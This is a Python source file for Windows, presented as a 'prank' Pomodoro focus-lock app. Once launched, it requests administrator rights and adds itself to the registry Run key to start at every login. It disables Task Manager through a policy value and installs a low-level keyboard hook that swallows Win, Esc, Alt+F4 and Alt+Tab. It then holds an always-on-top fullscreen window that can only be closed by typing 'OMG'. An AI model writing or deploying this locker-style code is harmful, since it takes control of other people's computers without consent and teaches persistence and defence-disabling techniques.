"""
🍅 番茄钟 - 整蛊专注锁屏版 v1.1.1
开机自启 → 全屏锁定 → 唯一出口：输入 OMG 解锁
修复：overrideredirect 与 -fullscreen 不能共存，改用手动全屏
"""
import tkinter as tk
import ctypes
import ctypes.wintypes
import sys
import os
import time
import threading
import winreg

# ─── Windows API ────────────────────────────────────────────
user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

VK_LWIN  = 0x5B
VK_RWIN  = 0x5C
VK_F4    = 0x73
VK_ESCAPE= 0x1B
VK_TAB   = 0x09
VK_MENU  = 0x12   # Alt

WH_KEYBOARD_LL = 13
WM_KEYDOWN     = 0x0100
WM_SYSKEYDOWN  = 0x0104

BLOCKED_KEYS = {VK_LWIN, VK_RWIN, VK_ESCAPE}

# ─── 低级键盘钩子 ─────────────────────────────────────────────
HOOKPROC = ctypes.WINFUNCTYPE(
    ctypes.c_long, ctypes.c_int, ctypes.c_uint, ctypes.POINTER(ctypes.c_void_p)
)

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode",      ctypes.c_uint32),
        ("scanCode",    ctypes.c_uint32),
        ("flags",       ctypes.c_uint32),
        ("time",        ctypes.c_uint32),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

_hook_id = None

def _keyboard_hook_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb  = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk  = kb.vkCode
        alt = bool(user32.GetAsyncKeyState(VK_MENU) & 0x8000)
        # 拦截 Win 键、Esc
        if vk in BLOCKED_KEYS:
            return 1
        # 拦截 Alt+F4
        if vk == VK_F4 and alt:
            return 1
        # 拦截 Alt+Tab
        if vk == VK_TAB and alt:
            return 1
    return user32.CallNextHookEx(_hook_id, nCode, wParam, lParam)

_hook_proc_ref = HOOKPROC(_keyboard_hook_proc)

def install_hook():
    global _hook_id
    _hook_id = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        _hook_proc_ref,
        kernel32.GetModuleHandleW(None),
        0
    )

def uninstall_hook():
    global _hook_id
    if _hook_id:
        user32.UnhookWindowsHookEx(_hook_id)
        _hook_id = None

# ─── 开机自启动 ───────────────────────────────────────────────
APP_NAME = "PomodoroFocusLock"
if getattr(sys, 'frozen', False):
    SCRIPT = f'"{sys.executable}"'
else:
    SCRIPT = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

def add_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, SCRIPT)
        winreg.CloseKey(key)
    except Exception:
        pass

def remove_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
    except Exception:
        pass

def disable_taskmgr():
    try:
        key = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        )
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception:
        pass

def enable_taskmgr():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
    except Exception:
        pass

# ─── 励志语录 ─────────────────────────────────────────────────
QUOTES = [
    "专注当下，方能成就未来。",
    "你离成功只差一个番茄的距离。",
    "Stay focused. Stay hungry.",
    "每一分钟的专注，都是对未来的投资。",
    "深度工作，是这个时代最稀缺的能力。",
    "心无旁骛，方得始终。",
    "Focus is the art of knowing what to ignore.",
    "成功不是偶然，而是专注积累的结果。",
    "此刻专注，未来感谢现在的自己。",
    "一次只做一件事，把它做到极致。",
]

# ─── 主程序 ───────────────────────────────────────────────────
class PrankLockApp:
    def __init__(self):
        self._running = True
        self.root = tk.Tk()
        self._setup_window()
        self._build_ui()
        self._start_guardian()
        self._start_quote_rotation()

    # ── 窗口设置（手动全屏，不用 -fullscreen）────────────────────
    def _setup_window(self):
        r = self.root
        r.title("🍅 专注模式 — 锁定中")
        r.configure(bg="#0d1117")

        sw = r.winfo_screenwidth()
        sh = r.winfo_screenheight()

        # overrideredirect 去掉标题栏/边框
        r.overrideredirect(True)
        # 手动铺满全屏（含任务栏）
        r.geometry(f"{sw}x{sh}+0+0")
        r.resizable(False, False)
        r.attributes("-topmost", True)

        # 拦截所有关闭/退出事件
        r.protocol("WM_DELETE_WINDOW", lambda: None)
        for seq in ("<Alt-F4>", "<Escape>", "<Alt-Tab>",
                    "<Super_L>", "<Super_R>",
                    "<Control-Alt-Delete>"):
            r.bind(seq, lambda e: "break")

    # ── 构建 UI ───────────────────────────────────────────────
    def _build_ui(self):
        r  = self.root
        sw = r.winfo_screenwidth()
        BG    = "#0d1117"
        RED   = "#ff4757"
        WHITE = "#f0f6fc"
        GRAY  = "#8b949e"
        DIM   = "#161b22"
        BLUE  = "#58a6ff"

        # 顶部标题
        tk.Label(r, text="🍅  专 注 模 式  🍅",
                 font=("Microsoft YaHei", 28, "bold"),
                 fg=RED, bg=BG).place(relx=0.5, rely=0.06, anchor="center")

        tk.Label(r, text="你正处于深度专注状态，请保持专注直到完成目标",
                 font=("Microsoft YaHei", 13),
                 fg=GRAY, bg=BG).place(relx=0.5, rely=0.12, anchor="center")

        # 番茄 Canvas（不依赖 -fullscreen，尺寸固定）
        cs = min(sw, r.winfo_screenheight()) // 3
        canvas = tk.Canvas(r, width=cs, height=cs, bg=BG, highlightthickness=0)
        canvas.place(relx=0.5, rely=0.38, anchor="center")
        pad = cs // 12
        cx  = cs // 2
        # 外光晕
        canvas.create_oval(pad//2, pad//2, cs-pad//2, cs-pad//2,
                           fill="", outline=RED, width=2)
        # 主体
        canvas.create_oval(pad, pad, cs-pad, cs-pad,
                           fill="#1a0505", outline=RED, width=3)
        # 叶子
        lw = cs // 5; lh = cs // 6; top = pad - cs // 14
        canvas.create_polygon(cx, top, cx-lw//2, top+lh, cx+lw//2, top+lh,
                              fill="#2ea043", outline="")
        # 文字
        canvas.create_text(cx, cx, text="专\n注",
                           font=("Microsoft YaHei", cs//6, "bold"), fill=RED)

        # 实时时钟
        self.clock_var = tk.StringVar()
        tk.Label(r, textvariable=self.clock_var,
                 font=("Consolas", 18), fg=GRAY, bg=BG
                 ).place(relx=0.5, rely=0.62, anchor="center")
        self._update_clock()

        # 励志语录
        self._quote_idx = 0
        self.quote_var  = tk.StringVar(value=QUOTES[0])
        tk.Label(r, textvariable=self.quote_var,
                 font=("Microsoft YaHei", 14, "italic"),
                 fg=BLUE, bg=BG, wraplength=int(sw * 0.7)
                 ).place(relx=0.5, rely=0.70, anchor="center")

        # 解锁区域
        frame = tk.Frame(r, bg=DIM, bd=0)
        frame.place(relx=0.5, rely=0.83, anchor="center")

        tk.Label(frame, text="🔐  输入解锁密码：",
                 font=("Microsoft YaHei", 12), fg=GRAY, bg=DIM
                 ).pack(side="left", padx=(16, 8), pady=12)

        self.pwd_var = tk.StringVar()
        self.entry   = tk.Entry(
            frame, textvariable=self.pwd_var,
            font=("Consolas", 16, "bold"), width=8,
            bg="#0d1117", fg=WHITE, insertbackground=WHITE,
            relief="flat", bd=0, justify="center"
        )
        self.entry.pack(side="left", padx=4, pady=12, ipady=6)

        tk.Button(
            frame, text="解  锁",
            font=("Microsoft YaHei", 12, "bold"),
            bg=RED, fg=WHITE, activebackground="#ff6b81",
            relief="flat", bd=0, padx=16, pady=6, cursor="hand2",
            command=self._try_unlock
        ).pack(side="left", padx=(4, 16), pady=12)

        self.hint_var = tk.StringVar()
        tk.Label(r, textvariable=self.hint_var,
                 font=("Microsoft YaHei", 11),
                 fg="#f85149", bg=BG
                 ).place(relx=0.5, rely=0.90, anchor="center")

        self.entry.bind("<Return>", lambda e: self._try_unlock())
        self.root.after(300, self.entry.focus_force)

        # 底部版权
        tk.Label(r, text="© 番茄钟专注系统  |  保持专注，拒绝分心",
                 font=("Microsoft YaHei", 9), fg="#30363d", bg=BG
                 ).place(relx=0.5, rely=0.97, anchor="center")

    # ── 时钟 ──────────────────────────────────────────────────
    def _update_clock(self):
        self.clock_var.set(time.strftime("📅 %Y年%m月%d日   🕐 %H:%M:%S"))
        self.root.after(1000, self._update_clock)

    # ── 语录轮换 ──────────────────────────────────────────────
    def _start_quote_rotation(self):
        def rotate():
            if not self._running:
                return
            self._quote_idx = (self._quote_idx + 1) % len(QUOTES)
            self.quote_var.set(QUOTES[self._quote_idx])
            self.root.after(8000, rotate)
        self.root.after(8000, rotate)

    # ── 守护线程：持续置顶 + 抢焦点 ─────────────────────────────
    def _start_guardian(self):
        def guard():
            HWND_TOPMOST = -1
            SWP_NOMOVE   = 0x0002
            SWP_NOSIZE   = 0x0001
            while self._running:
                try:
                    hwnd = self.root.winfo_id()
                    user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                                        SWP_NOMOVE | SWP_NOSIZE)
                    user32.SetForegroundWindow(hwnd)
                except Exception:
                    pass
                time.sleep(0.3)
        threading.Thread(target=guard, daemon=True).start()

    # ── 解锁 ──────────────────────────────────────────────────
    def _try_unlock(self):
        if self.pwd_var.get().strip() == "OMG":
            self._unlock()
        else:
            self.hint_var.set("❌  密码错误！提示：三个大写字母")
            self.pwd_var.set("")
            self._shake()
            self.entry.focus_force()

    def _shake(self):
        x0 = self.root.winfo_x()
        y0 = self.root.winfo_y()
        for dx in [12, -12, 9, -9, 6, -6, 3, -3, 0]:
            self.root.geometry(f"+{x0+dx}+{y0}")
            self.root.update()
            time.sleep(0.025)

    def _unlock(self):
        self._running = False
        uninstall_hook()
        remove_startup()
        enable_taskmgr()
        self.root.destroy()

    # ── 消息泵（键盘钩子需要 Windows 消息循环）──────────────────
    def _pump_messages(self):
        msg = ctypes.wintypes.MSG()
        while self._running:
            if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.01)

    # ── 启动 ──────────────────────────────────────────────────
    def run(self):
        install_hook()
        add_startup()
        disable_taskmgr()
        threading.Thread(target=self._pump_messages, daemon=True).start()
        self.root.mainloop()


# ─── 入口 ─────────────────────────────────────────────────────
if __name__ == "__main__":
    # 自动申请管理员权限
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            " ".join(f'"{a}"' for a in sys.argv),
            None, 1
        )
        sys.exit()

    app = PrankLockApp()
    app.run()
